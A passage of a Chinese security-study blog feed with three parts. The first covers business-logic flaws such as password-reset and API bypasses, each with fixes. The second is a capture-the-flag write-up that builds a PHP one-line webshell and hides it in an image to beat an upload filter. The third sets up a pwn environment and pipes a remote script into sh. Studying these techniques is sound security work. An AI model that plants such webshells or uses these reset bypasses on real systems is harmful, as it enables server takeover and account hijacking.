title="业务流程乱序测试"></a>业务流程乱序测试</h1><h2 id="业务流程绕过测试"><a href="#业务流程绕过测试" class="headerlink" title="业务流程绕过测试"></a>业务流程绕过测试</h2><p>该项主要针对业务流程的处理流程是否正常，确保攻击者无法通过技术手段绕过某些重要流程步骤，检验办理业务过程中是否有控制机制来保证其遵循正常流程。</p><h3 id="测试过程-23"><a href="#测试过程-23" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问注册页面，注册测试账户，充值提交并抓取数据包，填写任意充值金额并抓包，获取订单号，利用订单号构造充值链接并访问链接，查看是否充值成功，如果充值成功说明存在业务流程绕过问题。</p><h3 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对敏感信息如身份ID、账号密码、订单号、金额等进行加密处理，并在服务端对其进行二次比对。</p><h1 id="密码找回模块测试"><a href="#密码找回模块测试" class="headerlink" title="密码找回模块测试"></a>密码找回模块测试</h1><h2 id="验证码客户端回显测试-1"><a href="#验证码客户端回显测试-1" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>找回密码测试中要注意验证码是否会回显在响应中。</p><h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><p>填入要找回的账号，bp抓返回包找到正确验证码，将正确验证码发送给服务端已达到密码重置的目的。</p><h3 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h3><p>避免返回验证码到响应包中，验证码一定要放在服务端校验</p><h2 id="验证码暴力破解测试-1"><a href="#验证码暴力破解测试-1" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>找回密码功能模块中通常会将用户凭证发送到用户自己才可以看到的手机号或邮箱中，但有些应用在验证码发送功能模块中验证码位数及复杂性较弱，也没有对验证码做次数限制而导致验证码可被暴力枚举并修改任意用户密码。</p><h3 id="测试过程-24"><a href="#测试过程-24" class="headerlink" title="测试过程"></a>测试过程</h3><p>在app的找回密码功能，输入手机号并发送验证码（4位），</p><p>填写任意4位验证码，当请求包被拦截后可以观察到用户手机号，验证码（自己填的那个），密码。</p><p>将请求包发送到bp的Intruder模块中，并把验证码参数进行枚举测试。</p><h3 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对用户输入的验证码校验采取错误次数限制并提高验证码的复杂度。</p><h2 id="接口参数账号修改测试"><a href="#接口参数账号修改测试" class="headerlink" title="接口参数账号修改测试"></a>接口参数账号修改测试</h2><p>找回密码功能逻辑中常常会在用户修改密码接口提交此参数中存在传递用户账号的参数，而用户账号参数作为一个可控的变量是可以被篡改的，从而导致修改账号密码的凭证或修改的目标账号出现偏差，最终造成任意账号密码修改的漏洞。</p><p>通常在找回密码逻辑中，服务端会要求用户提供要修改的账号，给这个账号发送只有账号主人才能看到的凭证，但如果服务端对账号的控制逻辑不当，就会导致原有账号被篡改为其他账号，服务端把凭证发送给篡改后的账号的邮箱或手机，最终造成可利用凭证重置任意账号密码的漏洞。</p><h3 id="测试流程-1"><a href="#测试流程-1" class="headerlink" title="测试流程"></a>测试流程</h3><p>拦截前端请求，通过修改请求内邮箱或手机号等参数，将修改后数据发送给服务器进行欺骗，达到密码重置的目的。</p><h3 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h3><p>对找回密码的token做一对一的校验，一个token只能修改一个用户，同时保证token不泄露。</p><h2 id="Response状态值修改测试"><a href="#Response状态值修改测试" class="headerlink" title="Response状态值修改测试"></a>Response状态值修改测试</h2><p>修改请求的响应结果来达到密码啊重置的目的。该漏洞利用方式通常在服务端发送某个密码重置的凭证请求后，出现特定的响应值，比如true、1、ok、success等，网站看到回显内容为特定值后即修改密码，通常这种漏洞的回显值校验是在客户端进行的，所以只需要修改回显即可。</p><h3 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h3><p>不要在前端利用服务端返回值判断是否可以修改密码，要把整个校验环节交给服务端验证。</p><h2 id="Session覆盖测试（任意密码重置漏洞）"><a href="#Session覆盖测试（任意密码重置漏洞）" class="headerlink" title="Session覆盖测试（任意密码重置漏洞）"></a>Session覆盖测试（任意密码重置漏洞）</h2><p>找回密码逻辑漏洞测试中也会遇到参数不可控的情况，比如要修改的用户名或者绑定的手机号无法在提交参数时修改，服务端通过读取当前session会话来判断要修改密码的账号，这种情况下能否对Session中的内容做修改以达到任意密码重置的目的呢？</p><p>在某网站中的找回密码功能中，业务逻辑是：由用户使用手机进行注册，然后服务端向手机发送验证码短信，用户输入验证码提交后，进入密码重置页面。</p><p>对网站中Session覆盖的测试如下：</p><p>（1）需要准备自己的账号接收凭证（短信验证码）；</p><p>（2）获得凭证校验成功后进入密码重置页面；</p><p>（3）在浏览器新标签重新打开找回密码页面，输入目标手机号；</p><p>（4）此时当前 Session账户已经被覆盖，重新回到第二步中打开的重置密码页面即可重置目标手机号。</p><h3 id="测试过程-25"><a href="#测试过程-25" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在找回密码页面输入A手机号，接受验证码，通过验证后，进入密码重置页面</li><li>打开一个新标签，进入找回密码的第一步页面，输入B手机号码，向B手机号发送验证码，虽然无法拿到B手机号验证码，但是服务端已经将当前Session会话设置为B手机号的用户，这时候再刷新A手机号密码重置页面。</li><li>刷新后A手机号已经改为B手机号，说明Session成功覆盖。</li></ul><h3 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h3><p>Session覆盖类似于账号参数的修改，只是以控制当前Session的方式篡改了要重置密码的账号，在重置密码请求中一定要对修改的账号和凭证是否一致做进一步的校验。</p><h2 id="弱Token设计缺陷测试（看懂了但是不会做）"><a href="#弱Token设计缺陷测试（看懂了但是不会做）" class="headerlink" title="弱Token设计缺陷测试（看懂了但是不会做）"></a>弱Token设计缺陷测试（看懂了但是不会做）</h2><p>在找回密码功能中，网站向用户邮箱发送找回密码链接，用户进入链接进入密码重置页面，链接通常会加入校验参数来确认有效性，通过校验参数的值与数据库生成的值是否一致来判断当前找回密码的链接是否有效。</p><p>例如，网站给出的找回密码的url如下，单击这个链接将跳转到重置密码页面。</p><p><code>http://www.xxx.com/findpwd?uid=xx-uu-xx-sxx&amp;token=1497515314</code></p><p>uid对应修改密码的账号，token就是校验参数，cancel系统使用时间戳生成token，通过时间格式化后发现确实是日期，那么token就是可预测的一个时间范围，可以暴力枚举。</p><h3 id="测试流程-2"><a href="#测试流程-2" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>在密码找回功能中填写邮箱，多点击几次发送验证信息，可以在邮箱中获得多个找回密码的凭证，多封密码找回邮件，关照凭证规律，通过对比发现token不断变化，参数通过base64编码</li><li>解码查看，发现token值是base64(用户邮箱+随机4位验证码)，就可以暴力枚举获得验证码，加上用户名加上base64编码，最后得到任意用户的密码找回凭证。</li></ul><h3 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h3><p>密码找回token不能使用时间戳或用户邮箱和较短有规律可循的数字字符，应当使用复杂的token生成机制让攻击者无法推测出具体的值。</p><h2 id="密码找回流程绕过测试"><a href="#密码找回流程绕过测试" class="headerlink" title="密码找回流程绕过测试"></a>密码找回流程绕过测试</h2><p>用户修改密码需要向服务器发送修改密码请求，服务器通过后再修改数据库中相应的密码，所以在测试中我们首先要收集三个步骤的请求接口，这样我们可以指姐姐跳过凭证校验的接口去尝试直接重置密码。</p><h3 id="测试流程-3"><a href="#测试流程-3" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>先注册一个账号用于测试，在找回密码页面输入账号，找回密码页面url为<code>GET/account/findPassword.html</code></li><li>进入凭证验证流程，url为<code>GET/forgetpwd/findPassNext.do</code></li><li>通过验证后进入重置密码，<code>GET/forgetpwd/emailValidateNext.do</code></li><li>获取到三个步骤的url，尝试在输入账号后进入验证身份页面，修改该url为密码重置的url</li><li>经测试发现无需验证身份就可以直接进入重置密码页面，绕过了验证身份一步。</li></ul><h3 id="修复建议-37"><a href="#修复建议-37" class="headerlink" title="修复建议"></a>修复建议</h3><p>防止跳过验证步骤一定要在后端逻辑校验中确认上一步流程已经完成。</p><h1 id="业务接口调用模块测试"><a href="#业务接口调用模块测试" class="headerlink" title="业务接口调用模块测试"></a>业务接口调用模块测试</h1><h2 id="接口调用重放测试"><a href="#接口调用重放测试" class="headerlink" title="接口调用重放测试"></a>接口调用重放测试</h2><p>在短信、邮件调用业务或生成业务数据环节中，对业务环节进行调用(重放)测试，若业务经过调用后多次生成有效的业务或数据结果，可判断为存在接口调用问题</p><h3 id="测试流程-4"><a href="#测试流程-4" class="headerlink" title="测试流程"></a>测试流程</h3><p>在购买机票提交订单环节抓包，bp对生成订单的数据包进行重放测试。订单在一分钟内重复生成。</p><h3 id="修复建议-38"><a href="#修复建议-38" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>对生成订单环节采用验证码机制，防止生成数据业务被恶意调用</li><li>每一个订单使用唯一的token，订单提交一次后，token失效</li></ul><h2 id="接口调用遍历测试"><a href="#接口调用遍历测试" class="headerlink" title="接口调用遍历测试"></a>接口调用遍历测试</h2><p>web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取数据或者执行相应的功能，例如通过接口传入id参数，返回对应id的一些信息，在安全测试中，可以使用bp作为http代理，记录所有请求和响应信息，通过bp以登录后的状态对整站进行爬取，再使用过滤功能找到传入id参数的http请求，通过intruder对id参数进行遍历，看是否返回不同的响应信息，若不同的id值对应不同用户的信息，则说明存在漏洞。</p><h3 id="测试过程（看不懂，书166页）"><a href="#测试过程（看不懂，书166页）" class="headerlink" title="测试过程（看不懂，书166页）"></a>测试过程（看不懂，书166页）</h3><p>略</p><h3 id="修复建议-39"><a href="#修复建议-39" class="headerlink" title="修复建议"></a>修复建议</h3><p>在session中存储当前用户的凭证或id，只有传入凭证或id参数值与Session中的一致才返回数据内容</p><h2 id="接口调用参数篡改测试"><a href="#接口调用参数篡改测试" class="headerlink" title="接口调用参数篡改测试"></a>接口调用参数篡改测试</h2><p>修改对应请求中的手机号或邮箱参数值，修改后能接收到信息证明漏洞存在</p><h3 id="测试过程-26"><a href="#测试过程-26" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在验证码页面单击重新发送，抓包，将手机号码参数改为其他手机号，修改后的手机接收到验证码</li></ul><h3 id="修复建议-40"><a href="#修复建议-40" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>会话session中存储重要凭证，在忘记密码、重新发送验证码等业务中，从session获取用户凭证而不是从客户请求的参数中获取</li><li>从客户端处获取手机号、邮箱等账号信息，要与session中的凭证进行对比，验证通过后才允许进行业务操作。</li></ul><h2 id="接口未授权访问-x2F-调用测试"><a href="#接口未授权访问-x2F-调用测试" class="headerlink" title="接口未授权访问/调用测试"></a>接口未授权访问/调用测试</h2><p>在正常业务中，敏感功能的接口需要对访问者身份进行验证，通过后才允许调用接口，若接口没有身份验证，那么攻击者无须登录验证即可调用接口操作。</p><p>bp作为Http代理，在登录状态下记录所有请求和响应信息，筛选出敏感功能、返回敏感数据的请求，在未登录的情况下，使用浏览器访问对应敏感功能的请求，若返回的数据与与登录状态后的一致，则存在漏洞</p><h3 id="测试过程（又是个bp爬取的，妈的不会，176页）"><a href="#测试过程（又是个bp爬取的，妈的不会，176页）" class="headerlink" title="测试过程（又是个bp爬取的，妈的不会，176页）"></a>测试过程（又是个bp爬取的，妈的不会，176页）</h3><p>略</p><h3 id="修复建议-41"><a href="#修复建议-41" class="headerlink" title="修复建议"></a>修复建议</h3><p>采用token校验方式，在url中添加一个token参数，只有token验证通过才返回接口数据且token使用一次后失效</p><p>在接口被调用时，后端会对会话状态进行验证，若已经登录便返回接口数据，如果未登录则返回错误信息。</p><h2 id="Callback自定义测试"><a href="#Callback自定义测试" class="headerlink" title="Callback自定义测试"></a>Callback自定义测试</h2><p>在浏览器中存在同源策略，同源策略是指域名、协议、端口相同，当使用Ajax异步传输数据时，非同源域名之间会存在限制，其中有一种解决方法时jsonp，基本原理是利用了html里<code>&lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用json文件来实现数据传递，jsonp技术这种一般使用callback（回调函数）参数来声明回调时所使用的函数名，由于没有使用白名单的方法进行限制callback的函数名，导致攻击者可以自定义callback内容，从而触发xss等漏洞</p><h3 id="测试过程（178页）"><a href="#测试过程（178页）" class="headerlink" title="测试过程（178页）"></a>测试过程（178页）</h3><p>略</p><h3 id="修复建议-42"><a href="#修复建议-42" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>严格定义 HTTP 响应中的 Content-Type 为json 数据格式：<code>Content-Type：application/json</code></li><li>建立callback函数白名单，如果传入的callback参数值不在白名单内，跳转到统一的异常界面阻止其继续输出。</li><li>对callback参数进行HTML实体编码来过滤掉<code>“&lt;”、“&gt;”</code>等字符。</li></ul><h2 id="WebService测试"><a href="#WebService测试" class="headerlink" title="WebService测试"></a>WebService测试</h2><p>WebService是一种跨编程语言和跨操作系统平台的远程调用技术。XML+XSD、SOAP（Simple Object Access Protocol）和WSDL（WebServices Description Language）就是构成WebService平台的三大技术，其中XML+XSD用来描述、表达要传输的数据；SOAP是用于交换XML编码信息的轻量级协议，一般以XML或者XSD作为载体，通过HTTP协议发送请求和接收结果，SOAP协议会在HTTP协议的基础上增加一些特定的HTTP消息头；WSDL是一个基于XML的用于描述Web Service及其函数、参数和返回值的语言。</p><p>webservice就是一个应用程序向外界暴力出一个能通过web进行调用的api,它接收用户输入的参数，然后返回相关的数据内容，若一个webService完全信任用户的输入，不进行过滤，则有可能导致sql注入漏洞发生。</p><h3 id="测试过程（183页）"><a href="#测试过程（183页）" class="headerlink" title="测试过程（183页）"></a>测试过程（183页）</h3><h3 id="修复建议-43"><a href="#修复建议-43" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>为webservice添加身份认证，认证成功后才允许访问和调用</li><li>webservice中接收输入参数的函数，在后端应该对输入参数进行过滤及净化，在处理后才入库查询</li><li>在敏感功能的函数中，添加密码认证，认证后才允许调用敏感功能的函数。</li></ul><h1 id="实践篇"><a href="#实践篇" class="headerlink" title="实践篇"></a>实践篇</h1><h1 id="账号安全案例总结"><a href="#账号安全案例总结" class="headerlink" title="账号安全案例总结"></a>账号安全案例总结</h1><p>略</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>是攻击者插入到原本直接通信的双方中间，让双方以为还在直接跟对方通信，但实际上双方的通信对象已变成了攻击者，同时信息已经被中间人获取或篡改。而中间人攻击不仅可以捕获HTTP未加密的传输数据，更可以捕获HTTPS协议加密的数据。<br>HTTPS中间人攻击一般分为SSL连接建立前的攻击，以及HTTPS传输过程中的攻击。常见的HTTPS中间人攻击，会首先需结合ARP、DNS欺骗、伪造CA证书等技术，来对会话进行拦截。</p><h3 id="SSL证书欺骗"><a href="#SSL证书欺骗" class="headerlink" title="SSL证书欺骗"></a>SSL证书欺骗</h3><p>通过DNS劫持和局域网ARP欺骗甚至网关劫持等技术，将用户访问重定向到攻击者的设备上，让用户机器与攻击者机器建立https链接，而攻击者机器再跟web服务端连接，这样攻击者分别与用户和真正的服务器建立ssl连接。</p><h3 id="SSL劫持"><a href="#SSL劫持" class="headerlink" title="SSL劫持"></a>SSL劫持</h3><p>将页面中https超链接替换成http版本，用户始终以明文形式进行通信。</p><h3 id="撞库攻击"><a href="#撞库攻击" class="headerlink" title="撞库攻击"></a>撞库攻击</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。&lt;/p&gt;
&lt;p&gt;业务风险点识别应主要关注以下安全风险内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;业务环节存在的安全风险：业务环节存</summary>
      
    
    
    
    
    <category term="业务渗透" scheme="https://sinky.top/tags/%E4%B8%9A%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
    
    <category term="WEB,学习笔记" scheme="https://sinky.top/tags/WEB-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>WebShell文件上传漏洞分析溯源(第3题)</title>
    <link href="https://sinky.top/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/"/>
    <id>https://sinky.top/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/</id>
    <published>2022-11-02T03:29:18.354Z</published>
    <updated>2022-11-02T07:18:33.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复，【上一次漏洞地址】。”墨者”负责对修复后的系统做复测，然而发现还是存在高危漏洞。</p><p>实训目标</p><ol><li>掌握常见图片类型的文件头内容；</li><li>掌握表单数据通过POST提交数据时，对数据的修改方法；</li><li>了解WebShell是什么及其作用；</li><li>了解PHP程序的WebShell脚本的执行原理；</li></ol><p>解题方向</p><p>绕过页面对可执行文件上传的限制，利用WebShell读取服务器上的源代码内容。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>随便上传一个图片，返回信息为：文件上传成功，保存于：uploads/王也1.jpg</p><p>制作一句话图片木马</p><pre><code class="hljs">&lt;?php @eval($_POST['woshimuma']); ?&gt;</code></pre><p>新建文件下一句话，在其下存入木马文件2.php和图片1.jpg,在该目录下打开cmd</p><pre><code class="hljs">copy 1.jpg/b+2.php muma.jpg</code></pre><p>生成一句话图片木马，上传，bp拦截，修改<code>muma.jpg</code>后缀为php。</p><p>上传成功，得到路径，使用蚁剑连接。</p><p>蚁剑连接成功：<br>（图床又有毛病了，直接手打吧）</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url地址： ip:端口<span class="hljs-regexp">/uploads/mum</span>a.php<br>连接密码： woshimuma1<br>编码设置： UTF8<br>连接类型： PHP<br></code></pre></td></tr></tbody></table></figure><p>找到key: <code>mozheece9dc52403a1a5249a9075e4de</code></p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="常见图片的头文件格式"><a href="#常见图片的头文件格式" class="headerlink" title="常见图片的头文件格式"></a>常见图片的头文件格式</h2><ol><li><code>.jpeg</code><ol><li>文件头标识 (2 bytes): 0XFF, 0XD8 (SOI)</li><li>文件结束标识 (2 bytes): 0XFF, 0XD9 (EOI)</li></ol></li><li><code>.png</code><ol><li>文件头标识 (8 bytes)：0X89 0X50 0X4E 0X47 0X0D 0X0A 0X1A 0X0A</li></ol></li><li><code>.bmp</code><ol><li>文件头标识 (2 bytes)：0X42 0X4D</li></ol></li><li><code>.gif</code><ol><li>文件头标识 (6 bytes)0X47 0X49 0X46 0X38 0X39(37) 0X61        G I F 8 9 (7) a</li></ol></li><li><code>.tiff</code><ol><li>文件头标识 (2 bytes) 0X4D 0X4D 或 0X49 0X49</li></ol></li></ol><h2 id="Form表单、四种常见的POST请求提交数据方式"><a href="#Form表单、四种常见的POST请求提交数据方式" class="headerlink" title="Form表单、四种常见的POST请求提交数据方式"></a>Form表单、四种常见的POST请求提交数据方式</h2><h3 id="浏览器行为：Form表单提交"><a href="#浏览器行为：Form表单提交" class="headerlink" title="浏览器行为：Form表单提交"></a>浏览器行为：Form表单提交</h3><ol><li>form表单常用属性<ol><li>action: url地址，服务器接收表单数据的地址</li><li>method: 提交服务器的http方法，一般为post和get</li><li>name: 唯一性</li><li>enctype: 表单数据提交时使用的编码类型，默认使用<code>pplication/x-www-form-urlencoded</code>,如果使用post请求，则请求头中的content-type指定值就是该值，如果表单中有上传文件，编码类型需要使用<code>multipart/form-data</code>类型，才能完成传递文件数据。</li></ol></li></ol><p>enctype为form表单数据的编码格式，Content-type为Http传输的数据的编码格式。</p><ol start="2"><li>浏览器提交表单时，会执行如下步骤<ol><li>识别出表单中表单元素的有效项，作为提交项</li><li>构建一个表单数据集</li><li>根据form表单中的enctype属性的值作为content-type对数据进行编码</li><li>根据form表单中的action属性和method属性向指定的地址发送数据</li></ol></li><li>提交方式<ol><li>get: 表单数据会被encodeURIComponent后以参数的形式：name=value&amp;name2=value2附带在url?后面，再发送给服务器，并在url中显示出来。</li><li>post: enctype默认<code>application/x-www-form-urlencoded</code>对表单数据进行编码，数据以键值对在http请求体重发送给服务器，如果enctype属性为<code>multipart/form-data</code>,则以消息的形式发送给服务器。</li></ol></li></ol><h3 id="Post请求下的Content-Type类型（编码类型）"><a href="#Post请求下的Content-Type类型（编码类型）" class="headerlink" title="Post请求下的Content-Type类型（编码类型）"></a>Post请求下的Content-Type类型（编码类型）</h3><ul><li>application/x-www-form-urlencoded</li></ul><p>浏览器的原生 <code>&lt;form&gt;</code> 表单，如果不设置 <code>enctype </code>属性，那么最终就会以 <code>application/x-www-form-urlencoded </code>方式提交数据。请求类似于下面这样:</p><pre><code class="hljs">POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=utf-8title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</code></pre><p><code>Content-Type</code> 被指定为 <code>application/x-www-form-urlencoded</code>；其次，提交的数据按照 <code>key1=val1&amp;key2=val2</code> 的方式进行编码，key 和 val 都进行了 URL 转码。</p><ul><li>multipart/form-data</li></ul><p>使用表单上传文件时，必须让<code> &lt;form&gt;</code> 表单的 enctype 等于 multipart/form-data。</p><ul><li>application/json</li><li>text/xml: 一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范</li></ul><p>相比之下，get方式的数据提交方式（编码方式）只有一种，就是application/x-www-form-urlencoding</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><code>webshell</code>是网页后门，本质上是一种网页文件，一般由asp,php,jsp,asp.net等语言开发，<code>shell</code>的含义是取得对服务器某种程度上操作命令。常见的webshell有小马，大马，一句话木马</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>webshell被站长常用于网站管理、服务器管理等。根据FSO权限不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</li><li>被入侵者利用，从而达到控制网站服务器的目的。</li></ol><h3 id="webshell常见检测方式"><a href="#webshell常见检测方式" class="headerlink" title="webshell常见检测方式"></a>webshell常见检测方式</h3><ul><li>静态检测：通过匹配特征码、特征值、危险函数来查找webshell，但只能查找已知的webshell，主流的检测方法有关键字检查、审核代码逻辑等。速度快、对已知的webshell查找准确率高；误报率高，存在漏报，会被绕过。</li><li>动态监测： webshell在执行时表现出来的特征，我们称为动态特征。准确性高，但耗时、占用资源多</li></ul><p>主流的检测方法有文件状态对比(File Info Comparison)、运行特征(Feature Matching)、访问行为检测(Access Behavior)等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复</summary>
      
    
    
    
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="文件上传" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux18下搭建PWN环境</title>
    <link href="https://sinky.top/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://sinky.top/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</id>
    <published>2022-11-02T01:07:48.104Z</published>
    <updated>2022-11-02T02:46:03.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><pre><code class="hljs">sudo apt-get update #更新源sudo apt-get install python-pip #安装pip</code></pre><blockquote><p>出现报错 :</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">E: 无法获得锁 <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend - open (<span class="hljs-number">11</span>: 资源暂时不可用)<br>E: 无法获取 dpkg 前端锁 (<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend)，是否有其他进程正占用它？<br></code></pre></td></tr></tbody></table></figure><blockquote><p>解决方法：</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend<br>sudo rm <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/lock  <br>sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock<br></code></pre></td></tr></tbody></table></figure><p>续：</p><pre><code class="hljs">pip install --upgrade pip # 升级pipsudo pip install setuptools #安装setuptoolssudo apt-get install python-dev #安装python-devsudo pip install pwntools #安装pwntools</code></pre><p>安装结束之后进入python交互模式，输入import pwn后无报错即可。</p><h1 id="安装其他插件"><a href="#安装其他插件" class="headerlink" title="安装其他插件"></a>安装其他插件</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-comment"># 安装socat</span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装socat </span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装zio</span><br>sudo pip install zio​<br> <span class="hljs-comment"># 安装gcc</span><br>sudo apt-get install gcc<br> <span class="hljs-comment"># 安装gcc-multilib</span><br>sudo apt-get install gcc-multilib​<br> <span class="hljs-comment"># 安装gedit</span><br>sudo apt install gedit<br> <span class="hljs-comment"># 安装vim</span><br>sudo apt install vim<br> <span class="hljs-comment">#安装peda插件</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/longld/</span>peda.git ~/peda<br>echo <span class="hljs-string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit<br> <span class="hljs-comment">#安装gef插件 </span><br>wget -q -O- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hugsy/g</span>ef<span class="hljs-regexp">/raw/m</span>aster/gef.sh | sh <br>wget -q -O ~<span class="hljs-regexp">/.gdbinit-gef.py https:/</span><span class="hljs-regexp">/github.com/</span>hugsy<span class="hljs-regexp">/gef/</span>raw<span class="hljs-regexp">/master/g</span>ef.py<br>echo source ~<span class="hljs-regexp">/.gdbinit-gef.py &gt;&gt; ~/</span>.gdbinit<br></code></pre></td></tr></tbody></table></figure><h1 id="IDA远程调试Linux"><a href="#IDA远程调试Linux" class="headerlink" title="IDA远程调试Linux"></a>IDA远程调试Linux</h1><p>顺便搞一下得了。</p><p>找IDA文件/dbgsrv下面的linux_server和linux_server64,我ida里的是linux_serverx64，不过问题不大。</p><p>将俩文件复制到linux下，并复制保存好改路径，一会儿要用。</p><p>ifconfig查看linux的ip，然后复制保存好，监听端口一般都是默认的23946不用管。</p><p>在linux上运行linux_server报错权限不足，用命令chmod开一下。</p><pre><code class="hljs">chmod 777 linux_server</code></pre><p>在linux端运行linux_server: <code>./linux_server</code></p><p>打开ida（32位的）</p><p>然后 <code>Debugger-&gt; Run-&gt; Remote Linux debugger</code></p><p>输入信息：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Application: <span class="hljs-regexp">/home/</span>sudo<span class="hljs-regexp">/Desktop/i</span>da_linuxsever/linux_server<br>Directory: <span class="hljs-regexp">/home/</span>q<span class="hljs-regexp">/桌面/i</span>da_linuxsever<br>Parameters: [不用写]<br>Hostname: [linux的ip]<br>Password: [linux的密码]<br></code></pre></td></tr></tbody></table></figure><p>连接成功。</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="chmod用法"><a href="#chmod用法" class="headerlink" title="chmod用法"></a>chmod用法</h2><p>chmod 